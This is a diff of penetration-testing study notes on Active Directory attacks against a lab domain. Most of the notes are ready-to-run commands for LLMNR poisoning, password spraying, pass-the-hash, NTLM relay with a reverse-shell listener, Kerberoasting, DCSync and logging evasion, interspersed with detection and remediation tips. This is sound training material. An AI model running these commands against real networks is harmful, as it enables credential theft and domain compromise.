@@ -1,977 +1,718 @@
+# Active Directory Enumeration & Attacks
 
----
-## External Recon
+AD = Microsoft's directory service (x.500/LDAP roots) providing authentication, accounting, and authorization for Windows enterprises. ~43% of the enterprise IAM market; a huge attack surface of services + permissions that are chronically misconfigured. Attack mindset: enumerate iteratively, understand the "why" behind each flaw, and be able to work from Linux, Windows, and "living off the land" — tools fail or are blocked on real engagements.
 
-```bash
-# ASN / IP space
-# https://bgp.he.net → enter domain/IP
-# https://viewdns.info → reverse IP, DNS history
+Three attack-chain archetypes from real assessments worth internalizing:
 
-# Email/username harvesting
-# https://www.linkedin.com → manual scrape
-python3 linkedin2username.py -c <COMPANY> -n <DOMAIN>
+1. Kerberoast a weak service account → share write access → drop SCF files + Responder → catch a Domain Admin's NetNTLMv2 hash.
+2. SMB NULL session → full user list + password policy → careful spray (Spring@18 style) → BloodHound finds local-admin hosts → steal a DA's TGT from a live session (Rubeus) → pass-the-ticket.
+3. Kerbrute userenum from LinkedIn-mashed lists → spray Welcome2021 → one hit → DomainPasswordSpray from inside → Help Desk account with GenericAll over Enterprise Key Admins → Shadow Credentials on a DC machine account → DCSync = the domain.
 
-# Breach credential search
-python3 dehashed.py -q <domain.local> -p    # requires API key
+## External Recon and Enumeration Principles
 
-# Google dorks
-filetype:pdf inurl:<domain.com>
-intext:"@<domain.com>" inurl:<domain.com>
-```
+Validate scope, find leaked creds, build username lists before touching the internal network. Hunt for:
 
-**Username format derivation** → find PDF metadata: Author field often reveals format (first.last, flast, F9L8 GUID, etc.)
+- **IP space** — ASN/netblocks via IANA, arin, RIPE, Hurricane Electric BGP Toolkit (bgp.he.net). Big orgs have their own ASN; small ones squat on cloud provider space — know where infrastructure lives so you don't test out-of-scope third parties (some providers require written approval; AWS has testing guidelines; Oracle wants a notification).
+- **Domain info** — DNS records, subdomains, mail/DNS/VPN portals, defenses (SIEM/AV/IPS). domaintools, viewdns.info, manual `nslookup` against the domain's nameservers.
+- **Schema format** — email/username formats for spraying. Job postings (SharePoint 2013+2016 in a listing = in-place upgrades, version drift), LinkedIn, "About Us"/"Contact Us" pages. Google dorks: `filetype:pdf inurl:inlanefreight.com` for documents, `intext:"@inlanefreight.com" inurl:inlanefreight.com` for emails (metadata in PDFs leaks the internal username format — even GUID-style formats like F9L8).
+- **Data disclosures** — GitHub/AWS/Azure blobs, google dorks. Trufflehog, Greyhat Warfare.
+- **Breach data** — HaveIBeenPwned for breach exposure; Dehashed for cleartext passwords/hashes to try against VPN/OWA/O365/RDS/Citrix portals using AD auth.
 
-> [!tip] Breach data + Kerbrute userenum = fast internal foothold. Even old/disabled-account passwords are worth trying for password reuse.
+Enumeration is iterative: passive first (wide → narrow), analyze, then active. Save every file, screenshot, and tool output as you go.
 
----
+## Initial Enumeration of the Domain
 
-## Initial Internal Enumeration (Unauthenticated)
+Lab position: Linux attack host inside 172.16.5.0/23, no credentials, grey box, non-evasive. Internal test setups vary (VM calling back over VPN, physical drop box, on-site laptop, cloud VM, VPN access — which blocks LLMNR poisoning, managed workstation/VDI). Looking for: users to spray, key computers (DCs, file/SQL/web/mail servers), key services (Kerberos, NetBIOS, LDAP, DNS), and quick-win vulnerable hosts.
 
-**Passive — identify hosts without sending packets:**
+**Passive first — put an ear on the wire:**
 
 ```bash
-# Wireshark (GUI) or tcpdump (CLI)
-sudo tcpdump -i ens224
-
-# Responder analyze mode (no poisoning)
-sudo responder -I ens224 -A
+sudo wireshark                 # or tcpdump -i ens224; ARP + MDNS reveal hosts on the segment
+sudo responder -I ens224 -A    # analyze mode: listens for LLMNR/NBT-NS/MDNS, sends nothing
 ```
 
-**Active — ICMP sweep:**
+**Active host discovery:**
 
 ```bash
-fping -asgq 172.16.5.0/23
-# -a = alive only, -s = stats, -g = CIDR range, -q = quiet
+fping -asgq 172.16.5.0/23      # ICMP sweep, alive hosts only, stats at end
+sudo nmap -v -A -iL hosts.txt -oN host-enum    # feed discovered hosts; -oA to keep formats
 ```
 
-**Nmap — scan alive hosts:**
+Nmap flags the DC by its service set (53/88/135/139/389/445/464/593/636/3268/3269/3389). Old hosts (IIS 7.5, Server 2008 R2, MSSQL 2008) = legacy OS still alive — potential MS08-067/EternalBlue territory, but get client approval in writing before touching fragile legacy systems; they may prefer observe-and-report.
+
+**Kerbrute — username enumeration without credentials:**
 
 ```bash
-sudo nmap -v -A -iL hosts.txt -oA /home/htb-student/host-enum
-# DC signature ports: 53, 88, 135, 139, 389, 445, 464, 636, 3268, 3269, 3389
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
 ```
 
-**DC identification from Nmap output:**
+Uses Kerberos pre-auth; no 4625 logon-failure events (only 4768 TGT-request events, and only if Kerberos logging is enabled). ~48k names from the statistically-likely-usernames repo checked in ~10 seconds. Warning the tool itself prints: failed pre-auth counts as failed login and WILL lock accounts.
 
-- Port 88 (Kerberos) = Domain Controller
-- `rdp-ntlm-info` reveals `NetBIOS_Computer_Name`, `DNS_Domain_Name`
+SYSTEM on a domain-joined host ≈ domain user (the computer account can enumerate AD, Kerberoast, run Inveigh, token-impersonate). Ways in: remote exploits (MS08-067, EternalBlue, BlueKeep), SeImpersonate abuse (JuicyPotato — not always on Server 2019), local privesc flaws, local admin + PsExec.
 
-**Kerbrute user enumeration (no auth required, stealthy):**
+## LLMNR/NBT-NS Poisoning - from Linux
+
+LLMNR (UDP 5355) and NBT-NS (UDP 137) answer name-resolution when DNS fails — and **any** host can answer. Victim typos `\\printer01` → DNS says no → broadcast → Responder claims to be printer01 → victim sends NTLMv2 hash → crack offline or relay (relay needs SMB signing disabled).
 
 ```bash
-kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt -o valid_ad_users
-# Does NOT generate event ID 4625 (logon failure)
-# DOES generate event ID 4768 (TGT requested) if Kerberos logging enabled
+sudo responder -I ens224        # default poisoning mode
+# useful flags: -A analyze, -f fingerprint, -w WPAD rogue proxy, -F/-P force auth (can cause login prompts)
 ```
 
-> [!warning] SYSTEM access on domain-joined host = equivalent to low-priv domain user for enumeration. Paths to SYSTEM: EternalBlue, local privesc, SeImpersonate + JuicyPotato/PrintSpoofer.
-
----
-
-## LLMNR / NBT-NS Poisoning
-
-**How it works:** When DNS fails, Windows broadcasts LLMNR (UDP 5355) and NBT-NS (UDP 137). Responder answers these broadcasts → victim sends NTLMv2 hash.
-
-### From Linux — Responder
+Hashes land in `/usr/share/responder/logs/` as `SMB-NTLMv2-SSP-<ip>.txt` (also a SQLite DB). Needs root and a pile of free ports (137/138/53 UDP, 389, 445, 135, 139, 80, 21, 25, 110, 587, 3128, 5355/5353...). Run it in tmux alongside other work and collect.
 
 ```bash
-sudo responder -I ens224
-
-# Key flags
-# -A = analyze mode (no poisoning, passive)
-# -w  = WPAD rogue proxy (captures all HTTP)
-# -f  = fingerprint OS
-
-# Hashes saved to /usr/share/responder/logs/
-# Format: SMB-NTLMv2-SSP-<IP>.txt
-
-# Crack captured NTLMv2
-hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 forend_ntlmv2 rockyou.txt
 ```
 
-### From Windows — Inveigh
+NetNTLMv2 cannot be pass-the-hashed — crack or relay only. Same account produces different-looking hashes every time (random challenges); they're all the same password.
+
+## LLMNR/NBT-NS Poisoning - from Windows
+
+**Inveigh** (PowerShell legacy version + maintained C# InveighZero) does the same job from Windows. Covers LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP(S), SMB, LDAP, WebDAV, proxy auth.
 
 ```powershell
-# PowerShell version
 Import-Module .\Inveigh.ps1
 Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
-
-# C# version (InveighZero)
-.\Inveigh.exe
-# Press ESC to enter interactive console
-# GET NTLMV2UNIQUE   → unique hashes
-# GET NTLMV2USERNAMES → usernames + source IPs
-# STOP               → stop capture
 ```
 
-**NTLM Relay (instead of cracking):**
+C# version: run `Inveigh.exe`, hit ESC for the interactive console → `GET NTLMV2UNIQUE`, `GET NTLMV2USERNAMES`, `GET CLEARTEXT`, `STOP`. `[+]` = enabled, `[ ]` = disabled.
+
+**Remediation:** disable LLMNR via GPO (Computer Config > Admin Templates > Network > DNS Client > "Turn off multicast name resolution"). NBT-NS has no GPO — per-host adapter WINS setting, or push a startup script setting `NetbiosOptions=2` under `HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces` from SYSVOL. Also: SMB signing, filter 5355/137, alert on NBT-NS responses for nonexistent hosts.
+
+## Password Spraying Overview
+
+One password, many usernames, delays between rounds. Lockout math governs everything: typical policy = 5 bad attempts / 30-min lockout / auto-unlock. Unknown policy → one attempt max, or wait hours between. Always log: accounts targeted, DC used, time/date, passwords tried.
+
+Name-format creativity: GUID usernames (F9L8) leaked via PDF metadata → generate all combos with a bash brace loop → Kerbrute enumerates 100% of accounts.
+
+## Enumerating & Retrieving Password Policies
+
+Credentialed:
 
 ```bash
-# 1. Disable SMB in /etc/responder/Responder.conf: SMB = Off
-# 2. Run relay
-impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
-# Default: dumps SAM database
-
-# Relay + exec command
-impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <BASE64>'
-
-# 3. Catch reverse shell
-nc -lvnp 9001
+crackmapexec smb 172.16.5.5 -u avazquez -p <PASSWORD> --pass-pol
 ```
 
-**Mitigation detection signals:** Event IDs 4697 (service install), 7045 (new service), registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast`
-
----
-
-## Password Spraying
-
-### Enumerate Password Policy First
+Unauthenticated (SMB NULL session — often left over from in-place DC upgrades):
 
 ```bash
-# CME (credentialed)
-crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+rpcclient -U "" -N 172.16.5.5      # then: querydominfo, getdompwinfo, enumdomusers
+enum4linux -P 172.16.5.5           # password policy dump
+enum4linux-ng -P 172.16.5.5 -oA ilfreight   # same + JSON/YAML output
+```
 
-# SMB NULL session (unauthenticated)
-rpcclient -U "" -N 172.16.5.5
-rpcclient $> getdompwinfo
-# or
-enum4linux -P 172.16.5.5
-enum4linux-ng -P 172.16.5.5 -oA ilfreight
+LDAP anonymous bind:
 
-# LDAP anonymous bind
+```bash
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
-
-# Windows (domain-joined)
-net accounts                          # CMD
-Get-DomainPolicy | select -ExpandProperty SystemAccess   # PowerView
 ```
 
-**Key policy fields:** `lockoutThreshold`, `lockoutDuration`, `resetLockoutCount`, `minPwdLength`, `pwdProperties` (1 = complexity enabled)
+Windows:
 
-> [!warning] Safe spray rule: lockoutThreshold - 2 attempts, wait lockoutDuration + 5 min between rounds. NEVER spray with more attempts than threshold-1. Document every attempt with timestamp.
-
-### Build User List
-
-```bash
-# SMB NULL session
-enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
-rpcclient -U "" -N 172.16.5.5 → enumdomusers
-crackmapexec smb 172.16.5.5 --users         # unauthenticated
-crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users  # credentialed
-
-# LDAP anonymous bind
-ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
-./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
-
-# Kerbrute (no auth, validates against Kerberos)
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
-```
-
-### Execute Spray
-
-```bash
-# Linux — rpcclient one-liner
-for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
-
-# Linux — Kerbrute
-kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
-
-# Linux — CrackMapExec (grep + = successes)
-crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
-
-# Validate credential
-crackmapexec smb 172.16.5.5 -u avazquez -p Password123
-
-# Local admin hash spray across subnet
-crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```cmd
+net accounts                     :: policy in one shot; also net use \\DC01\ipc$ "" /u:"" tests NULL session
+                                 :: error 1331 = disabled acct, 1326 = bad password, 1909 = locked out
 ```
 
 ```powershell
-# Windows — DomainPasswordSpray (auto-enumerates users from AD, respects policy)
-Import-Module .\DomainPasswordSpray.ps1
-Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+Import-Module .\PowerView.ps1
+Get-DomainPolicy                  :: adds PasswordComplexity flag visibility
 ```
 
----
+Default domain policy (never changed in plenty of orgs): min length 7, complexity on, history 24, lockout threshold 0.
+
+## Password Spraying - Making a Target User List
+
+Sources: SMB NULL session, LDAP anonymous bind, Kerbrute + wordlist, existing creds.
+
+```bash
+enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+rpcclient -U "" -N 172.16.5.5 -c enumdomusers
+crackmapexec smb 172.16.5.5 --users      # NULL session; shows badpwdcount + baddpwdtime per user
+                                         # filter out accounts near lockout; multi-DC = sum the counters
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U       # anonymous LDAP; also --da, -PU (nested privileged users)
+```
+
+## Internal Password Spraying - from Linux
+
+```bash
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Password123' | grep +
+```
+
+Local admin password reuse — spray the NT hash across the subnet (gold images), one shot per host:
+
+```bash
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
+`--local-auth` prevents domain lockouts. Noisy; report it regardless (fix = LAPS). Also try password patterns across account types (`$desktop%@admin123` → `$server%@admin123`), user vs their `_adm` account, and cross-domain same-name users.
+
+## Internal Password Spraying - from Windows
+
+DomainPasswordSpray auto-generates the user list from AD, reads the lockout threshold, and strips accounts within one attempt of lockout:
+
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success
+```
+
+Detection: 4625 floods (SMB), 4771 Kerberos pre-auth failures (LDAP-based spraying, needs Kerberos logging enabled). Mitigations: MFA on all external portals, least-privilege access, separate admin accounts, passphrase education + password filters blocking months/seasons/company name.
 
 ## Enumerating Security Controls
 
+Post-foothold checks that shape tool choice:
+
 ```powershell
-# Windows Defender status
-Get-MpComputerStatus | select RealTimeProtectionEnabled,AMServiceEnabled,AntispywareEnabled
-
-# AppLocker rules
+Get-MpComputerStatus              # Defender: RealTimeProtectionEnabled, behavior monitor, tamper protection
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-
-# PowerShell language mode
-$ExecutionContext.SessionState.LanguageMode
-# ConstrainedLanguage = restricted, FullLanguage = unrestricted
-
-# LAPS — who can read LAPS passwords
-Find-LAPSDelegatedGroups           # groups with LAPS read rights per OU
-Find-AdmPwdExtendedRights          # users with AllExtendedRights (can read LAPS)
-Get-LAPSComputers                  # computers with LAPS + cleartext password if accessible
-
-# Firewall state
-netsh advfirewall show allprofiles
-
-# Defender check (CMD)
-sc query windefend
-
-# Downgrade PowerShell to v2 (evades script block logging)
-powershell.exe -version 2
-# Confirm: Get-Host → Version: 2.0
+$ExecutionContext.SessionState.LanguageMode    # ConstrainedLanguage = locked-down PowerShell
 ```
 
-> [!tip] PowerShell v2 downgrade escapes script block logging (PSv3+ only). Logs still show `powershell.exe -version 2` was run — defender may notice and investigate.
+AppLocker often blocks only `%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe` — the SysWOW64 copy or PowerShell_ISE still runs.
 
----
+LAPS enumeration (LAPSToolkit):
 
-## Credentialed Enumeration — From Linux
+```powershell
+Find-LAPSDelegatedGroups          # who can read LAPS passwords per OU
+Find-AdmPwdExtendedRights         # accounts with All Extended Rights (can read passwords)
+Get-LAPSComputers                 # expiry dates, and cleartext passwords if readable
+```
 
-### CrackMapExec (NetExec)
+## Credentialed Enumeration - from Linux
+
+CrackMapExec (smb/winrm/mssql/ssh) — every flag is a mini-tool:
 
 ```bash
-# Domain user enumeration
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
-# badpwdcount field → skip users near lockout
-
-# Group enumeration
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
-
-# Logged-on users (pivot target hosts)
-crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
-# (Pwn3d!) = local admin on that host
-
-# Share enumeration
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
-
-# Spider share for sensitive files
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
-# Output → /tmp/cme_spider_plus/<IP>.json
-
-# Remote exec
-crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' -x 'whoami' --exec-method smbexec
-crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' -X 'whoami'   # PowerShell
-
-# SAM dump
-crackmapexec smb 172.16.5.5 -u administrator -p 'Password123!' --sam
-
-# Pass-the-Hash
-crackmapexec smb 172.16.5.5 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+sudo crackmapexec smb 172.16.5.5 -u forend -p <PASSWORD> --users          # + badpwdcount per user
+sudo crackmapexec smb 172.16.5.5 -u forend -p <PASSWORD> --groups
+sudo crackmapexec smb 172.16.5.130 -u forend -p <PASSWORD> --loggedon-users   # (Pwn3d!) = local admin
+sudo crackmapexec smb 172.16.5.5 -u forend -p <PASSWORD> --shares
+sudo crackmapexec smb 172.16.5.5 -u forend -p <PASSWORD> -M spider_plus --share 'Department Shares'
+# spider_plus writes a JSON file inventory of every readable file to /tmp/cme_spider_plus/<ip>.json
 ```
 
-### SMBMap
+SMBMap:
 
 ```bash
-smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
-smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
-smbmap -u forend -p Klmcargo2 -H 172.16.5.5 --download "notes\note.txt"
+smbmap -u forend -p <PASSWORD> -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u forend -p <PASSWORD> -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 ```
 
-### rpcclient
+rpcclient — RID mechanics: domain SID + RID = object SID. Built-in Administrator is always RID 500 (0x1f4).
 
 ```bash
-rpcclient -U "" -N 172.16.5.5          # null session
-rpcclient -U "forend%Klmcargo2" 172.16.5.5
-
-rpcclient $> enumdomusers              # list users + RIDs
-rpcclient $> queryuser 0x457           # query by RID
-rpcclient $> querydominfo              # domain info
-rpcclient $> getdompwinfo              # password policy
+rpcclient -U "" -N 172.16.5.5
+> queryuser 0x457
+> enumdomusers
 ```
 
-### Impacket
+Impacket remote shells:
 
 ```bash
-# PSExec — drops to SYSTEM via SMB service upload
-psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
-
-# WMIExec — semi-interactive, runs as user (not SYSTEM), fewer logs
-wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
-
-# secretsdump — DCSync
-secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-secretsdump.py -outputfile hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
-# -just-dc-ntlm = NTLM only; -just-dc-user = specific user; -pwd-last-set; -history; -user-status
+psexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.125    # uploads service binary to ADMIN$, SYSTEM shell
+wmiexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.5     # WMI, no file drops, runs as the connecting user; each command = new cmd.exe (4688 events)
 ```
 
-### windapsearch
+windapsearch (LDAP):
 
 ```bash
-python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
-python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
-# -PU = privileged users (recursive nested group membership)
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p <PASSWORD> --da    # Domain Admins
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p <PASSWORD> -PU    # nested privileged users
 ```
 
-### BloodHound.py
+BloodHound.py ingestor (needs Impacket, ldap3, dnspython; works from a non-domain-joined host with just creds):
 
 ```bash
-sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
-# Produces: computers.json, domains.json, groups.json, users.json
-zip -r ilfreight_bh.zip *.json
-# Upload zip to BloodHound GUI
-# Start neo4j: sudo neo4j start
-# Start GUI: bloodhound
+sudo bloodhound-python -u forend -p <PASSWORD> -ns 172.16.5.5 -d inlanefreight.local -c all
+# → <date>_computers/domains/groups/users.json → zip and upload to the BloodHound GUI (neo4j start; bloodhound)
 ```
 
----
+GUI: Analysis tab pre-built queries (Find Shortest Paths to Domain Admins first), Node Info, custom Cypher in the Raw Query box.
 
-## Credentialed Enumeration — From Windows
+## Credentialed Enumeration - from Windows
 
-### AD PowerShell Module
+ActiveDirectory PowerShell module (stealthiest — blends into admin traffic):
 
 ```powershell
 Import-Module ActiveDirectory
-
-# Domain info
-Get-ADDomain
-
-# SPN accounts (Kerberoasting targets)
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-
-# Trust relationships
-Get-ADTrust -Filter *
-
-# Group enumeration
-Get-ADGroup -Filter * | select name
+Get-ADDomain                                          # SID, functional level, child domains, FSMO holders
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # Kerberoast targets
+Get-ADTrust -Filter *                                 # direction, IntraForest vs ForestTransitive
 Get-ADGroup -Identity "Backup Operators"
 Get-ADGroupMember -Identity "Backup Operators"
-
-# Check reversible encryption
-Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 ```
 
-### PowerView
+PowerView core functions:
 
 ```powershell
 Import-Module .\PowerView.ps1
-
-# User info
-Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,memberof,pwdlastset,lastlogontimestamp,admincount,serviceprincipalname,useraccountcontrol
-
-# SPN users (Kerberoasting)
-Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
-
-# ASREPRoasting targets
-Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
-
-# Recursive group membership
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-
-# Trust mapping
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select name,samaccountname,memberof,pwdlastset,admincount,serviceprincipalname,useraccountcontrol
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse      # nested membership expanded
 Get-DomainTrustMapping
-Get-DomainTrust
-
-# Test local admin access
-Test-AdminAccess -ComputerName ACADEMY-EA-MS01
-
-# Find computers where Domain Users are local admin
-# BloodHound query: Find Computers where Domain Users are Local Admin
-
-# PASSWD_NOTREQD flag
-Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
-
-# Find passwords in description field
-Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01                # IsAdmin True/False
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+Find-InterestingDomainAcl                                      # ACLs with modification rights on non-built-ins
+Get-DomainFileServer / Get-DomainDFSShare
 ```
 
-### SharpHound (BloodHound Ingestor)
+SharpView = .NET port, same verbs — useful where PowerShell is blocked.
+
+Snaffler (share pillaging from a domain context):
+
+```powershell
+.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o snaffler.log
+# color-coded: Red = .key/.kdbx/.ppk/credentials-ish, Black = password DBs; Green shares
+```
+
+SharpHound from a domain-joined host:
 
 ```powershell
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
-# Upload resulting zip to BloodHound GUI
 ```
 
-### Snaffler
+Upload the zip in the GUI. Useful queries: Find Computers with Unsupported Operating Systems (verify "live" before reporting — stale AD records exist), Find Computers where Domain Users are Local Admin. First BH check after any foothold: does Domain Users have local admin or execution rights anywhere?
 
-```powershell
-Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
-# -s = print to console, -d = domain, -o = output file, -v data = show only findings
-# Color codes: Red = high priority (keys, certs, SQL dumps), Black = medium
-```
+## Living Off the Land
 
----
+When tools can't be loaded (managed host, VDI, no internet):
 
-## Living Off the Land (No Tools)
-
-```powershell
-# Host info
-hostname
-[System.Environment]::OSVersion.Version
-systeminfo
-
-# Patch level
+```cmd
+hostname & systeminfo                       :: one command, fewer logs than the stack of wmic/set/ipconfig
 wmic qfe get Caption,Description,HotFixID,InstalledOn
-
-# Network
-ipconfig /all
-arp -a
-route print
-netsh advfirewall show allprofiles
-
-# Domain info
-echo %USERDOMAIN%
-echo %logonserver%
-wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
-
-# Active sessions
-qwinsta
-
-# Users/groups (CMD - use net1 instead of net to avoid some detections)
+wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress   # domain + trusts
+wmic useraccount list /format:list
 net accounts /domain
-net group /domain
 net group "Domain Admins" /domain
-net group "domain computers" /domain
 net user /domain
-net user %username%
-net localgroup administrators /domain
+net view /domain
+net1 group "Domain Admins" /domain         :: net1 dodges alerts keyed on the "net" string
+qwinsta                                     :: who else is logged on
+arp -a & route print                        # known hosts + reachable networks (pivot candidates)
+```
 
-# AD PowerShell dsquery (available on DC or with RSAT)
+dsquery (DLL ships on all modern Windows; needs elevated shell):
+
+```cmd
 dsquery user
 dsquery computer
 dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
-# Users without Kerberos pre-auth (PASSWD_NOTREQD)
-dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
-# Find DCs
-dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
-
-# PowerShell history (may contain passwords)
-Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
-
-# Environment variables
-Get-ChildItem Env: | ft Key,Value
-
-# WMI
-wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
-wmic process list /format:list
-wmic useraccount list /format:list
-wmic group list /format:list
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl   :: PASSWD_NOTREQD accounts
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -attr sAMAccountName    :: Domain Controllers
 ```
 
----
+LDAP OID matching rules: `1.2.840.113556.1.4.803` = bit must match exactly, `...804` = any bit matches, `...1941` = recursive/DN matching. Combine with `&` `|` `!` operators.
 
-## Kerberoasting
+PowerShell opsec: `powershell.exe -version 2` downgrades to a version where script-block logging doesn't exist (the downgrade command itself is logged — 400/4104 events stop after). `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` = the user's command history (passwords live there).
 
-**Concept:** Any domain user can request a TGS for any SPN. TGS encrypted with service account's NTLM hash → crack offline. Hashcat mode `13100` (RC4/etype 23), `19700` (AES256/etype 18).
+Checks: `netsh advfirewall show allprofiles`, `sc query windefend`, `Get-MpComputerStatus`.
 
-### From Linux
+## Kerberoasting - from Linux
+
+Any domain user can request a TGS for any SPN account; the TGS-REP is encrypted with the service account's NT hash → offline crack. Service accounts are frequently privileged (local admin on many hosts, Domain Admins via nesting). Even a low-priv hit is useful: crack sqldev → craft service tickets for MSSQLSvc → sysadmin on the SQL box → xp_cmdshell.
 
 ```bash
-# List SPN accounts
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
-
-# Request all TGS tickets
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
-
-# Request specific user
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend                 # list SPN accounts + group membership
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request        # all tickets, hashcat-ready
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
-
-# Crack
-hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
-
-# Cross-forest Kerberoasting
-GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
-GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+hashcat -m 13100 sqldev_tgs rockyou.txt
+# hashes: $krb5tgs$23$ = RC4 (fast to crack); $krb5tgs$18$ = AES256 → mode 19700, far slower
 ```
 
